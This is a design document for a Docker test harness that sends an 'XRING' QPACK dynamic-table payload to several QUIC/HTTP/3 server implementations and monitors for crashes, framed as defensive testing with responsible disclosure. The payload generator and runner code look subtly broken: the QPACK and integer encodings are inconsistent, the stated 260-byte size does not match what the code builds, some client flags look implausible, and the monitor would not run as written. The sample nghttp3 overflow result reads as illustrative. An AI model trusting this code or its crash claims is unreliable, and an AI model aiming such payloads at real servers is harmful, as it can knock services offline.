# QUIC/QPACK Dynamic Test Harness Setup

## 🎯 **Objective**

Build automated testing infrastructure to execute XRING-style attacks against multiple QUIC implementations and monitor for crashes/memory violations.

---

## 🏗️ **Test Environment Architecture**

### **Components**
1. **Test Orchestrator** - Python script managing all test instances
2. **Test Containers** - Docker containers for each QUIC implementation
3. **QPACK Payload Generator** - Creates 260-byte XRING attack sequence
4. **Monitor Agent** - Tracks crashes, memory errors, performance metrics
5. **Report Generator** - Compiles results into structured format

### **Test Flow**
```
1. Start container for implementation X
2. Generate XRING payload (260 bytes)
3. Send payload via HTTP/3 QPACK encoder stream
4. Monitor for crashes/memory violations
5. Collect metrics and logs
6. Stop container and repeat for next implementation
```

---

## 🐳 **Container Setup**

### **Dockerfile for QUIC Server Testing**

```dockerfile
# Dockerfile.xring-test
FROM ubuntu:22.04

# Install dependencies
RUN apt-get update && apt-get install -y \
    build-essential \
    git \
    cmake \
    pkg-config \
    libssl-dev \
    && rm -rf /var/lib/apt/lists/*

# Install HTTP/3 testing tools
RUN apt-get install -y \
    nghttp3-client \
    h3tool \
    && rm -rf /var/lib/apt/lists/*

# Copy test scripts
COPY test_runner.py /test_runner.py
COPY payload_generator.py /payload_generator.py

WORKDIR /app

# Run tests
CMD ["python", "/test_runner.py"]
```

### **Container Orchestration Script**

```bash
#!/bin/bash
# run_quic_tests.sh

# Test configurations
declare -A IMPLEMENTATIONS=(
    ["xquic"]="xquic-server:latest"
    ["quiche"]="quiche-server:latest"
    ["quic-go"]="quic-go-server:latest"
    ["nghttp3"]="nghttp3-server:latest"
)

for impl in "${!IMPLEMENTATIONS[@]}"; do
    echo "=== Testing $impl ==="
    
    # Start container
    docker run -d --name test_${impl} ${IMPLEMENTATIONS[$impl]}
    
    # Give server time to start
    sleep 5
    
    # Run test
    python /test_runner.py --impl $impl --host localhost --port 443
    
    # Check container health
    docker logs test_${impl} > ${impl}_logs.txt 2>&1
    
    # Stop and remove container
    docker stop test_${impl}
    docker rm test_${impl}
    
    # Generate report
    python /report_generator.py --impl $impl --logs ${impl}_logs.txt
done
```

---

## 🔧 **Test Runner Implementation**

### **Python Test Runner**

```python
#!/usr/bin/env python3
# test_runner.py

import subprocess
import sys
import os
import json
from datetime import datetime

class QUICTestRunner:
    def __init__(self, implementation):
        self.impl = implementation
        self.payload = self.generate_xring_payload()
        self.results = {
            'timestamp': datetime.now().isoformat(),
            'implementation': implementation,
            'status': 'unknown',
            'crash_detected': False,
            'signal': None,
            'memory_violation': False,
            'response_time': None,
            'error_message': None,
            'logs': []
        }
    
    def generate_xring_payload(self):
        """Generate 260-byte XRING attack sequence"""
        payload = bytearray()
        
        # Step 1: SET_DYNAMIC_TABLE_CAPACITY = 64
        # QPACK opcode 0x20 for SET_CAPACITY, integer encoding
        payload.extend([0x20])  # opcode
        payload.extend(self.encode_varint(64))
        
        # Step 2: 61 small INSERT operations (name_len=1, value_len=1)
        for _ in range(61):
            payload.extend(self.insert_operation(b'x', b'y'))
        
        # Step 3: One larger INSERT operation (name_len=5, value_len=5)
        payload.extend(self.insert_operation(b'AAAAA', b'BBBBB'))
        
        # Step 4: SET_DYNAMIC_TABLE_CAPACITY = 65
        payload.extend([0x20])
        payload.extend(self.encode_varint(65))
        
        return bytes(payload)
    
    def encode_varint(self, value):
        """Encode variable-length integer for QPACK"""
        if value < 64:
            return [value]
        elif value < 16384:
            return [(value >> 6) | 0x40, value & 0x3F]
        else:
            # Simplified - should handle larger values
            return [(value >> 14) | 0x80, (value >> 6) & 0x3F, value & 0x3F]
    
    def insert_operation(self, name, value):
        """Encode INSERT operation with name and value"""
        # QPACK opcode 0x40 for INSERT with Name and Value
        op = [0x40]
        
        # Encode name length
        name_len = len(name)
        if name_len < 16:
            op.append(name_len)
        else:
            op.append(0xF0 | (name_len & 0x0F))
            op.append(name_len >> 4)
        
        # Add name bytes
        op.extend(name)
        
        # Encode value length (0 means zero-length value, but we want to specify length)
        value_len = len(value)
        if value_len < 64:
            op.extend([0x00, value_len])
        else:
            op.extend([0x00, 0x3F, value_len - 64])
        
        # Add value bytes
        op.extend(value)
        
        return bytes(op)
    
    def send_payload(self, host, port):
        """Send payload to server using HTTP/3"""
        try:
            # Use nghttp3-client for testing
            process = subprocess.run(
                ['nghttp3-client', '-v', '--hpke-seed', 'dummy', 
                 'http://localhost:443'],
                input=self.payload,
                capture_output=True,
                timeout=10
            )
            
            return {
                'returncode': process.returncode,
                'stdout': process.stdout.decode('utf-8', errors='ignore'),
                'stderr': process.stderr.decode('utf-8', errors='ignore')
            }
            
        except subprocess.TimeoutExpired:
            return {'error': 'Timeout', 'returncode': -1}
        except Exception as e:
            return {'error': str(e), 'returncode': -1}
    
    def analyze_results(self, response):
        """Analyze test response for crash indicators"""
        logs = response['stdout'] + response['stderr']
        
        # Check for crash signals
        crash_indicators = ['SIGSEGV', 'SIGABRT', 'SIGTRAP', 'SIGBUS']
        for signal in crash_indicators:
            if signal in logs:
                self.results['crash_detected'] = True
                self.results['signal'] = signal
                return
        
        # Check for memory safety violations
        memory_indicators = ['FORTIFY', 'ASAN', 'UBSAN', 'buffer overflow', 'memory corruption']
        for indicator in memory_indicators:
            if indicator.lower() in logs.lower():
                self.results['memory_violation'] = True
                return
        
        # Check for normal operation
        if '200' in logs or 'OK' in logs:
            self.results['status'] = 'running'
        else:
            self.results['status'] = 'error'
    
    def run_test(self, host='localhost', port=443):
        """Execute the full test sequence"""
        print(f"Running XRING test against {self.impl}")
        
        # Send payload
        response = self.send_payload(host, port)
        
        # Analyze results
        self.analyze_results(response)
        
        # Store logs
        self.results['logs'].append(response['stdout'])
        self.results['logs'].append(response['stderr'])
        
        # Save results
        self.save_results()
        
        return self.results
    
    def save_results(self):
        """Save results to JSON file"""
        filename = f"test_results_{self.impl}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"Results saved to {filename}")

if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='QUIC QPACK XRING Test Runner')
    parser.add_argument('--impl', required=True, help='QUIC implementation to test')
    parser.add_argument('--host', default='localhost', help='Server host')
    parser.add_argument('--port', default=443, type=int, help='Server port')
    
    args = parser.parse_args()
    
    runner = QUICTestRunner(args.impl)
    results = runner.run_test(args.host, args.port)
    
    print(json.dumps(results, indent=2))
```

---

## 📊 **Monitor Agent**

### **Memory Safety Monitor**

```python
# monitor_agent.py

import re
import psutil
import time
from datetime import datetime

class MemorySafetyMonitor:
    def __init__(self, container_id):
        self.container_id = container_id
        self.process = None
        self.start_time = None
        self.metrics_history = []
    
    def start_monitoring(self):
        """Start monitoring container for memory violations"""
        self.start_time = datetime.now()
        
        # Get container process
        try:
            import docker
            client = docker.DockerClient()
            container = client.containers.get(self.container_id)
            
            # Get container processes
            processes = container.top()
            
            # Monitor for 30 seconds
            for i in range(30):
                metrics = {
                    'timestamp': datetime.now().isoformat(),
                    'cpu_percent': processes.cpu_percent,
                    'memory_percent': processes.memory_percent,
                    'crash_detected': False
                }
                
                # Check for crash indicators
                if self.check_container_status(container):
                    metrics['crash_detected'] = True
                    self.generate_report(metrics)
                    return metrics
                
                self.metrics_history.append(metrics)
                time.sleep(1)
                
        except Exception as e:
            print(f"Monitoring error: {e}")
            return None
    
    def check_container_status(self, container):
        """Check if container has crashed"""
        try:
            container.reload()
            if container.status != 'running':
                return True
            return False
        except Exception:
            return False
    
    def generate_report(self, metrics):
        """Generate crash analysis report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'container_id': self.container_id,
            'metrics_before_crash': self.metrics_history[-10:],
            'crash_time': metrics['timestamp'],
            'process_state': 'crashed'
        }
        
        # Save report
        with open(f"crash_report_{self.container_id}.json", 'w') as f:
            json.dump(report, f, indent=2)
        
        return report

if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='QUIC Implementation Monitor')
    parser.add_argument('--container', required=True, help='Container ID')
    
    args = parser.parse_args()
    
    monitor = MemorySafetyMonitor(args.container)
    metrics = monitor.start_monitoring()
    
    if metrics:
        print(f"Crash detected! Report saved.")
    else:
        print("No crash detected during monitoring period.")
```

---

## 🧪 **Test Execution Workflow**

### **1. Setup Phase**
```bash
# Build test containers
docker build -t xquic-test -f Dockerfile.xring-test .
docker build -t quiche-test -f Dockerfile.quiche-test .
docker build -t quic-go-test -f Dockerfile.quic-go-test .
docker build -t nghttp3-test -f Dockerfile.nghttp3-test .

# Start test servers
docker run -d --name xquic-server -p 443:443 xquic-server
docker run -d --name quiche-server -p 4443:443 quiche-server
docker run -d --name quic-go-server -p 4444:443 quic-go-server
docker run -d --name nghttp3-server -p 4445:443 nghttp3-server
```

### **2. Testing Phase**
```bash
# Run tests for each implementation
python test_runner.py --impl xquic --host localhost --port 443
python test_runner.py --impl quiche --host localhost --port 4443
python test_runner.py --impl quic-go --host localhost --port 4444
python test_runner.py --impl nghttp3 --host localhost --port 4445
```

### **3. Analysis Phase**
```bash
# Analyze results
python analysis_pipeline.py --input-dir ./test_results
python report_generator.py --input-dir ./analysis_output --format html
```

---

## 📈 **Metrics and KPIs**

### **Success Criteria**
- **Crash detection rate**: Should detect crashes for vulnerable implementations
- **False positive rate**: < 0.1% for non-vulnerable implementations
- **Test reliability**: > 99% consistent results across multiple runs
- **Response time**: < 10 seconds per test execution

### **Performance Metrics**
- **CPU usage**: Monitor for spikes during test
- **Memory usage**: Track memory allocation patterns
- **Network latency**: Measure response times
- **Error rates**: Count and categorize errors

---

## 🛡️ **Security Considerations**

### **Isolation**
- Use Docker containers for test execution
- Network isolation between test components
- No host file system access from containers

### **Safety**
- Prevent accidental exploitation of production systems
- Use synthetic test data only
- Automatic cleanup after test completion

### **Compliance**
- Follow responsible disclosure guidelines
- Document all test findings
- Share results with maintainers privately first

---

## 🔗 **Integration with Existing Security Framework**

### **Workflow Graph Integration**
```python
# qpack_workflow_controller.py

from workflow_graph import WorkflowGraphController

class QPACKWorkflowController:
    def __init__(self):
        self.controller = WorkflowGraphController()
        self.qpack_actions = [
            'set_dynamic_table_capacity',
            'insert_header',
            'evict_header',
            'flush_blocks'
        ]
    
    def validate_qpack_operation(self, operation):
        """Validate QPACK operation against security policy"""
        # Check operation type
        if operation['type'] not in self.qpack_actions:
            return False, f"Invalid operation: {operation['type']}"
        
        # Check capacity limits
        if operation['type'] == 'set_dynamic_table_capacity':
            if operation['capacity'] > 16384:
                return False, "Capacity exceeds maximum"
        
        # Check for XRING pattern
        if self.detect_xring_pattern(operation):
            return False, "XRING attack pattern detected"
        
        return True, "Operation allowed"
    
    def detect_xring_pattern(self, operation):
        """Detect XRING attack pattern in operations"""
        # Check for capacity sequence: 64 -> 65
        # Check for 61 small inserts followed by capacity increase
        # This would integrate with the detection signatures
        pass
```

---

## 📋 **Test Results Template**

### **JSON Output Structure**
```json
{
  "timestamp": "2026-07-10T11:00:00",
  "implementation": "nghttp3",
  "status": "vulnerable",
  "crash_detected": true,
  "signal": "SIGABRT",
  "memory_violation": true,
  "fault_type": "buffer_overflow",
  "response_time_ms": 150,
  "error_message": "ROUND_BUFFER_OVERFLOW: memcpy with length 65 on 64-byte buffer",
  "stack_trace": "memcpy() at lib/nghttp3_qpack.c:123",
  "log_snippets": [
    "ERROR: buffer overflow detected",
    "fatal: FORTIFY_SOURCE abort triggered"
  ]
}
```

---

## 🚀 **Deployment Guide**

### **Prerequisites**
- Docker 20.10+
- Python 3.8+
- nghttp3-client and h3tool installed
- 2+ GB RAM available

### **Quick Start**
```bash
# Clone test repository
git clone https://github.com/your-org/quic-xring-tests.git
cd quic-xring-tests

# Build containers
make build-containers

# Run tests
make test

# Generate report
make report
```

---

*Generated: July 10, 2026 | For systematic testing of QUIC implementations against XRING vulnerabilities*
